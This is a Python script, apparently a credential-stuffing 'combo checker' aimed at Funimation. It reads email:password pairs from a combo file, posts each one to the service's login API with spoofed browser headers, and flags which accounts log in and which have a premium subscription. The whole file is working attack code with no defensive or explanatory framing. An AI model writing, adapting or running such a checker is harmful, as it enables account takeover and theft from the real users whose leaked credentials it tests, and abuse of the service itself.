import requests
import sys
import json
from colorama import init

init(autoreset=True)
archive_name = 'combos.txt'
counter = 0
banner = """

▄▄▄█████▓ ▒█████   ██▓███    █████▒██▓     ▒█████   ▒█████   ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░▓█▒  ░▒██░    ▒██   ██░▒██   ██░▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░ ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░ ░▒ ░      ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
  ░      ░ ░ ░ ▒  ░░        ░ ░     ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░ 
             ░ ░                      ░  ░    ░ ░      ░ ░     ░     
                                                                     

"""
print(banner)


def comboss():
    global counter
    a = open(archive_name, 'r')
    b = a.read()
    # b = email:password \n email:password
    c = b.find('\n')
    # number of line breaks
    combo = b[0:c]
    if combo == '':
        print('Checked: ', counter - 1, 'accounts from the combo')
        return print('The combo file does not contain more accounts')

    # combo = email:password only one
    d = open(archive_name, 'w')
    replacement = b.replace(combo + '\n', '')
    # replace in b the combo with nothing
    # print the replacement
    d.write(replacement)
    a.close()
    d.close()
    combo_only = combo.find(':')
    if combo_only == -1:
        print('No valid combo found!')
        sys.exit()
    email = combo[0:combo_only]
    password = combo[combo_only + 1:c]
    url = 'https://prod-api-funimationnow.dadcdigital.com/api/auth/login/'
    r = requests.Session()
    params = {
        'username': email,
        'password': password
    }
    headers = {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.funimation.com',
        'territory': 'MX',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
    }
    response = r.post(url, data=params, headers=headers)
    json_list = response.json()
    if 'error' in json_list:
        print('\033[31m' + combo, ' -> Authentication failed')
    else:
        json_load = json.dumps(json_list)
        premium = json_load[35:47]
        if premium == 'premium plus':
            print('\033[42m' + combo, ' -> Premium!')
        else:
            print('\033[45m' + combo, ' -> Not Premium!')
    ver()


def ver():
    global counter
    counter = counter + 1
    files = open(archive_name, 'r')
    fi = files.read()
    files.close()

    di = open(archive_name, 'w')
    di.write(fi + '\n')
    di.close()

    files = open(archive_name, 'r')
    fi = files.read()
    files.close()

    if fi == '' or fi == '\n' or fi == '\n\n':
        print('Checked: ', counter - 1, 'accounts from the combo')
        return print('The combo file does not contain more accounts')
    else:
        comboss()

ver()
